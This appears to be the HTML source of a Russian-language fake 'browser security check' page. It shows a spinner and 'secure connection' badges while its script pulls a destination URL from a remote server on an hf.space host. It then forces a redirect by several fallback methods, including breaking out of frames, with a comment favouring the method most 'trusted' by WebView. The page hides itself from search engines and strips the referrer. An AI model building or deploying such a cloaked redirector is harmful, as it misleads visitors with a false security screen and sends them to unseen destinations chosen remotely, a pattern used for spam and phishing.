<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <title>Проверка безопасности браузера</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #333;
        }
        .card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 20px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #4d81f1;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 20px; margin-bottom: 12px; font-weight: 600; color: #111827; }
        p { font-size: 15px; color: #4b5563; line-height: 1.5; }
        .secure-badge {
            margin-top: 30px;
            font-size: 12px;
            color: #9ca3af;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        #errorMsg { display: none; color: #ef4444; margin-top: 15px; font-size: 14px; }
        #debugLog { display: none; color: #9ca3af; margin-top: 10px; font-size: 11px; word-break: break-all; }
        
        .loading-bar {
            height: 4px; width: 100%; background: #f3f4f6;
            position: absolute; top: 0; left: 0;
        }
        .loading-bar::after {
            content: ''; position: absolute; left: -30%; top: 0; height: 100%; width: 30%;
            background: #4d81f1; animation: load 2s infinite ease-in-out;
        }
        @keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
    </style>
</head>
<body>
    <div class="card">
        <div class="loading-bar"></div>
        <div class="spinner"></div>
        <h1>Проверка браузера...</h1>
        <p>Пожалуйста, подождите. Идет безопасное соединение, не закрывайте страницу.</p>
        <div id="errorMsg"></div>
        <div id="debugLog"></div>
        <div class="secure-badge">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            Защищено соединение
        </div>
    </div>

    <script>
        const MY_PROXY_API = "https://post517-my-redirects.hf.space/api.php";

        function appendUtmSource(targetUrl) {
            try {
                if (targetUrl.startsWith('http://')) {
                    targetUrl = targetUrl.replace('http://', 'https://');
                } else if (!targetUrl.startsWith('http')) {
                    targetUrl = 'https://' + targetUrl;
                }

                const urlParams = new URLSearchParams(window.location.search);
                const utmSource = urlParams.get('utm_source');
                if (utmSource) {
                    const urlObj = new URL(targetUrl);
                    urlObj.searchParams.set('utm_source', utmSource);
                    return urlObj.toString();
                }
            } catch (e) {
                console.error('Error appending utm_source', e);
            }
            return targetUrl;
        }

        function doRedirect(url) {
            url = appendUtmSource(url);
            try {
                if (window.top && window.top !== window) {
                    window.top.location.replace(url);
                }
            } catch (e) {}
            
            // 1. Метод Form Submit (самый трастовый для WebView и IP-адресов)
            setTimeout(() => {
                try {
                    const form = document.createElement('form');
                    form.action = url;
                    form.method = 'GET';
                    document.body.appendChild(form);
                    form.submit();
                } catch (e) {}
            }, 10);

            // 2. Метод a.click()
            setTimeout(() => {
                try {
                    const a = document.createElement('a');
                    a.href = url;
                    a.rel = 'noopener noreferrer';
                    document.body.appendChild(a);
                    a.click();
                } catch (e) {}
            }, 50);

            // 3. Fallback location.replace
            setTimeout(() => {
                window.location.replace(url);
            }, 100);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const start = Date.now();
            const minDelay = 1500;
            const maxWait = 15000;
            const errMsg = document.getElementById('errorMsg');
            const debugLog = document.getElementById('debugLog');

                        function fetchWithRetry(url, retries) {
                return fetch(url)
                    .then(response => response.json().then(data => ({ status: response.status, data })))
                    .catch(err => {
                        if (retries > 0) {
                            if (debugLog) {
                                debugLog.style.display = 'block';
                                debugLog.textContent = "Ожидание ответа сервера... (" + retries + ")";
                            }
                            return new Promise(r => setTimeout(r, 2500)).then(() => fetchWithRetry(url, retries - 1));
                        }
                        throw err;
                    });
            }

            const fetchPromise = fetchWithRetry(MY_PROXY_API, 3);
                
            const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Timeout: превышено время ожидания')), maxWait)
            );

            Promise.race([fetchPromise, timeoutPromise])
                .then(({ status, data }) => {
                    if (data && data.success && data.url) {
                        const elapsed = Date.now() - start;
                        const delay = Math.max(0, minDelay - elapsed);
                        setTimeout(() => {
                            doRedirect(data.url);
                        }, delay);
                    } else {
                        throw new Error(data.error || 'Unknown Error (Status ' + status + ')');
                    }
                })
                .catch(error => {
                    console.error("Fetch Error:", error);
                    errMsg.style.display = 'block';
                    errMsg.textContent = "Ошибка: " + error.message;
                    if (debugLog) {
                        debugLog.style.display = 'block';
                        debugLog.textContent = "DEBUG: " + error.message;
                    }
                    document.querySelector('.spinner').style.display = 'none';
                    document.querySelector('.loading-bar').style.display = 'none';
                });
        });
    </script>
</body>
</html>
